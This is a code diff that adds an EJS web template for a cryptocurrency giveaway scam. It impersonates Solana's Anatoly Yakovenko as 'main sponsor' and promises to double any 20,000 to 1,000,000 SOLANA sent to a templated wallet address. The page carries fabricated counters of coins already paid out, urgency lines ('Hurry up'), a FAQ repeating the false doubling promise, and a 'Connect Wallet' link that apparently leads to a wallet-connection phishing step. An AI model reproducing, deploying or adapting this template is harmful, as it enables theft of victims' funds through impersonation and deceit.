@@ -1,0 +1,131 @@
+<%- include("partials/header") %>
+<main id="event">
+  <div class="container">
+    <div class="profile wow fadeInLeft animated" style="visibility: visible; animation-name: fadeInLeft;">
+      <div class="avatar"> <img src="templates/vechain/index_files/avatar.png" alt=""> <span><img src="templates/vechain/index_files/vechain.png"></span> </div>
+      <p>Anatoly Yakovenko</p> <span>Main sponsor of this event</span> <a href="#rules" class="more">More info</a>
+    </div>
+    <div class="right">
+      <h1 class="wow fadeInRight animated" data-wow-delay="0.1s" style="visibility: visible; animation-delay: 0.1s; animation-name: fadeInRight;">
+        make sure you participate
+        in this giveaway of
+        <span style="display: inline-block;">500 000 000 SOLANA</span>
+      </h1>
+      <p class="wow fadeInRight animated" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInRight;"> in this unique event we will give you the opportunity to
+        <br> win 500 000 000 SOLANA, have a look at the rules and
+        <br> don't miss on your opportunity!
+      </p>
+      <ul>
+        <li class="wow fadeInUp animated" data-wow-delay="0.5s" style="visibility: visible; animation-delay: 0.5s; animation-name: fadeInUp;"> Price Predictions </li>
+        <li class="wow fadeInUp animated" data-wow-delay="0.7s" style="visibility: visible; animation-delay: 0.7s; animation-name: fadeInUp;"> Marketplace </li>
+        <li class="wow fadeInUp animated" data-wow-delay="0.9s" style="visibility: visible; animation-delay: 0.9s; animation-name: fadeInUp;"> Live Event </li>
+      </ul> <a href="#give" class="give wow fadeInUp animated" data-wow-delay="1s" style="visibility: visible; animation-delay: 1s; animation-name: fadeInUp;">Participate in the giveaway</a>
+    </div>
+  </div>
+</main>
+<section id="rules" class="info_site">
+  <div class="container">
+    <div class="col">
+      <div class="info big wow fadeInUp animated" data-wow-delay="0.1s" style="visibility: visible; animation-delay: 0.1s; animation-name: fadeInUp;">
+        <p class="title">For example</p>
+        <ul>
+          <li> If you send 20 000+ SOLANA, you will get 40 000+ SOLANA back. </li>
+          <li> If you send 40 000+ SOLANA, you will get 80 000+ SOLANA back. </li>
+          <li> If you send 60 000+ SOLANA, you will get 120 000+ SOLANA back. </li>
+          <li> If you send 100 000+ SOLANA, you will get 200 000+ SOLANA back. </li>
+          <li> If you send 200 000+ SOLANA, you will get 400 000+ SOLANA back. </li>
+          <li> If you send 500 000+ SOLANA, you will get 1 000 000+ SOLANA back. </li>
+          <li> If you send 1 000 000+ SOLANA, you will get 2 000 000+ SOLANA back. </li>
+        </ul>
+      </div>
+    </div>
+    <div class="col">
+      <div class="info sm wow fadeInUp animated" data-wow-delay="0.2s" style="visibility: visible; animation-delay: 0.2s; animation-name: fadeInUp;">
+        <p class="title">About</p>
+        <p class="text"> We believe that Blockchain and SOLANA coin will make the world more easy.
+          <br> To speed up the process of cryptocurrency mass adoption, We decided to run 500 000 000 SOLANA giveaway.
+        </p>
+      </div>
+      <div class="info sm wow fadeInUp animated" data-wow-delay="0.4s" style="visibility: visible; animation-delay: 0.4s; animation-name: fadeInUp;">
+        <p class="title">Rules</p>
+        <p class="text"> To participate you just need to send from 20 000 SOLANA to 1 000 000 SOLANA to the contribution address and we will immediately send you back <span style="display: inline-block;">40 000 SOLANA</span> to <span>2 000 000</span> SOLANA (x2) to the address you sent it from. </p>
+      </div>
+    </div>
+  </div>
+</section>
+<section id="give" class="send">
+  <div class="container">
+    <div class="col">
+      <p class="wow fadeInLeft animated" data-wow-delay="0.1s" style="visibility: visible; animation-delay: 0.1s; animation-name: fadeInLeft;">212 938 065 SOLANA already sent to participants!</p> <span class="wow fadeInLeft animated" data-wow-delay="0.3s" style="visibility: visible; animation-delay: 0.3s; animation-name: fadeInLeft;">Hurry up and participate in this giveaway!</span>
+      <div class="adress">
+        <p class="wow fadeInLeft animated" data-wow-delay="0.5s" style="visibility: visible; animation-delay: 0.5s; animation-name: fadeInLeft;">You can send SOLANA to the following address:</p>
+        <div class="inp_adr wow fadeInLeft animated" data-wow-delay="0.7s" style="visibility: visible; animation-delay: 0.7s; animation-name: fadeInLeft;"><%- walletAddress %><div class="icon" onclick="CopyToClipboard('wallet');">
+            <object type="image/svg+xml" data="templates/vechain/index_files/copy.svg"></object>
+          </div>
+        </div>
+        <p class="wait wow fadeInLeft animated" data-wow-delay="0.9s" style="visibility: visible; animation-delay: 0.9s; animation-name: fadeInLeft;">Waiting for payment <a href="/connect-wallet" style="padding: 1em; margin-left: 1em; background-color: black; border-radius: 0.5em;"> Connect Wallet</a></p>
+      </div>
+    </div>
+    <div class="col container-progress">
+      <div class="progress wow fadeInRight animated" data-wow-delay="0.1s" style="position: relative; visibility: visible; animation-delay: 0.1s; animation-name: fadeInRight;"> <span class="perc" id="percent">57%</span>
+        <div class="cont"> <span id="ost_line">287 061 935</span> <span>500 000 000</span> </div>
+        <div class="qr wow fadeInUp animated" data-wow-delay="0.5s" style="visibility: visible; animation-delay: 0.5s; animation-name: fadeInUp;"> <img src="/templates/vechain/img/qr.png" alt="" width="100">
+          <p>Use this QR code</p> <span>or SOLANA address <br>
+            to participate</span>
+        </div>
+        <svg viewBox="0 0 36 36" class="circular-chart" style="z-index: -1">
+          <path class="circle bg" stroke-dasharray="100, 100" d="M18 2.0845
+                            a 15.9155 15.9155 0 0 1 0 31.831
+                            a 15.9155 15.9155 0 0 1 0 -31.831"></path>
+        </svg>
+        <svg id="progress" viewBox="0 0 36 36" class="circular-chart">
+          <path class="circle" stroke-dasharray="57, 100" d="M18 2.0845
+                            a 15.9155 15.9155 0 0 1 0 31.831
+                            a 15.9155 15.9155 0 0 1 0 -31.831"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+</section>
+<section id="faq" class="faq">
+  <div class="items">
+    <div class="item wow fadeInUp animated" style="visibility: visible; animation-name: fadeInUp;"> <span>What do I have to do to participate in the giveaway?</span>
+      <div class="text">
+        <p> To participate you just need to send from 20 000 SOLANA to 1 000 000 SOLANA to the contribution address and we will immediately send you back 40 000 SOLANA to 2 000 000 SOLANA (x2) to the address you sent it from. </p>
+      </div>
+    </div>
+    <div class="item wow fadeInUp animated" style="visibility: visible; animation-name: fadeInUp;"> <span>How long will it take me to get my bonus?</span>
+      <div class="text">
+        <p> You get your x2 bonus instantly! The system is fully automated, so all transactions are sent without delay! </p>
+      </div>
+    </div>
+    <div class="item wow fadeInUp animated" style="visibility: visible; animation-name: fadeInUp;"> <span>Who is the sponsor of this giveaway?</span>
+      <div class="text" style="display: none; opacity: 0;">
+        <p> The main sponsor of this event is Anatoly Yakovenko. </p>
+      </div>
+    </div>
+    <div class="item wow fadeInUp animated" style="visibility: visible; animation-name: fadeInUp;"> <span>How many times can I participate in the giveaway?</span>
+      <div class="text">
+        <p> You can only participate once. </p>
+      </div>
+    </div>
+    <div class="item wow fadeInUp animated" style="visibility: visible; animation-name: fadeInUp;"> <span>How do I get my bonus?</span>
+      <div class="text">
+        <p> The system will automatically send the bonus to the wallet from which you participated in the giveaway. </p>
+      </div>
+    </div>
+  </div>
+</section>
+<section id="transactions" class="transactions">
+  <div class="container">
+    <h2>
+      Transactions for Address
+    </h2> <span class="adress" id="wallet"><%- walletAddress %></span>
+    <div id="Transactions" class="transaction-container">
+      <div class="transaction-table">
+        <div class="table-body"> </div>
+      </div>
+    </div>
+  </div>
+</section>
+<%- include("partials/footer") %>
